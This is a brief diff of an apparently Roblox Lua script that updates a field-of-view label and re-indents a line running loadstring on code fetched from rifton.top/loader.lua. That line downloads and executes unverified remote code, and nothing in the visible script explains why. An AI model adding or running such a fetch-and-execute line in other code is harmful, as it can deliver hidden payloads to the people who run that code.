@@ -31,5 +31,5 @@ local function main(v)
                     v.Text = "视野 : "..textnumber
                 end
             end)
-
-loadstring(game:HttpGet("https://rifton.top/loader.lua"))()
+            
+            loadstring(game:HttpGet("https://rifton.top/loader.lua"))()
